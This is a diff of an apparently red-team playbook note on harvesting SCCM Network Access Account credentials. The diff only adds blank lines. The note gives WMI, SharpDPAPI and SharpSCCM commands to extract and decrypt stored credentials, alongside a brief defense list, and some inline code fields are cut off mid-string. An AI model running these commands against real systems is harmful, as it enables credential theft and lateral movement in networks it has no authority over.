@@ -35,6 +35,8 @@ From a technical perspective, SCCM Blob Finder and SCCM Credential Retrieval are
 
 The business value of this attack lies in the ability of the attacker to gain access to sensitive data and systems within the network. This can lead to data theft, system compromise, and reputational damage.
 
+ 
+
 ## Requirements
 
 1. Access to the SCCM database
@@ -42,6 +44,8 @@ The business value of this attack lies in the ability of the attacker to gain ac
 1. Permissions to perform queries using SCCM Blob Finder and SCCM Credential Retrieval
 
 1. Permissions to check CIM Repository ACL
+
+ 
 
 ## Defense
 
@@ -51,19 +55,31 @@ The business value of this attack lies in the ability of the attacker to gain ac
 
 1. Regularly review and update permissions for SCCM network access accounts
 
+ 
+
 ## Objectives
 
 1. Retrieve SCCM network access account credentials
 
 1. Gain access to other systems and data within the network
 
+ 
+
 # Instructions
 
 1. This command is used to find SCCM blob.
 
+ 
+
+
+
 **Code**: [[Get-Wmiobject -namespace "root\ccm\policy\Machine\]]
 
+
+
 > The SCCM blob contains important data related to SCCM policies and configurations. This command retrieves the SCCM blob by querying the WMI object 'CCM_NetworkAccessAccount' in the namespace 'root\ccm\policy\Machine\ActualConfig'. The NetworkAccessPassword and NetworkAccessUsername fields in the output contain the encrypted SCCM blob data.
+
+
 
 **Command** ([[Retrieve Network Access Account Configuration]]):
 
@@ -71,13 +87,23 @@ The business value of this attack lies in the ability of the attacker to gain ac
 Get-Wmiobject -namespace \"root\ccm\policy\Machine\ActualConfig\" -class \"CCM_NetworkAccessAccount\"\nNetworkAccessPassword : <![CDATA[E600000001...8C6B5]]>\nNetworkAccessUsername : <![CDATA[E600000001...00F92]]>
 ```
 
+
+
 2. To use this command, run the following command in PowerShell: .\SharpDPAPI.exe SCCM
 .\SharpSCCM.exe get naa -u USERNAME -p PASSWORD
+
+ 
+
+
 
 **Code**: [[.\SharpDPAPI.exe SCCM
 .\SharpSCCM.exe get naa -u U]]
 
+
+
 > This command can be used to retrieve and decrypt SCCM credentials. The command uses two tools, SharpDPAPI and SharpSCCM, to perform the retrieval and decryption. The 'naa' argument specifies the type of SCCM credential to retrieve. The 'USERNAME' and 'PASSWORD' arguments should be replaced with the actual SCCM username and password. Once the command is run, the decrypted credentials will be displayed in the output.
+
+
 
 **Command** ([[Retrieve SCCM Credentials]]):
 
@@ -85,15 +111,27 @@ Get-Wmiobject -namespace \"root\ccm\policy\Machine\ActualConfig\" -class \"CCM_N
 .\SharpDPAPI.exe SCCM
 ```
 
+
+
+
+
 **Command** ([[Get SCCM Data]]):
 
 ```bash
 .\SharpSCCM.exe get naa -u USERNAME -p PASSWORD
 ```
 
+
+
 3. Run the following command in PowerShell:
 
+ 
+
+
+
 **Code**: [[Get-Acl C:\Windows\System32\wbem\Repository\OBJECT]]
+
+
 
 > This command retrieves the Access Control List (ACL) for the CIM repository file located at the specified path. The ACL determines which users and groups have access to the file and what level of access they have. The `Format-List` cmdlet is used to display the results in a list format, including the path to the file and the Security Descriptor Definition Language (SDDL) string that represents the ACL. The `ConvertFrom-SddlString` cmdlet can be used to convert the SDDL string into a more readable format.
 
@@ -117,3 +155,5 @@ Get-Wmiobject -namespace \"root\ccm\policy\Machine\ActualConfig\" -class \"CCM_N
 
 - [[Active Directory Attacks]]
 - [[SCCM Network Access Accounts]]
+
+
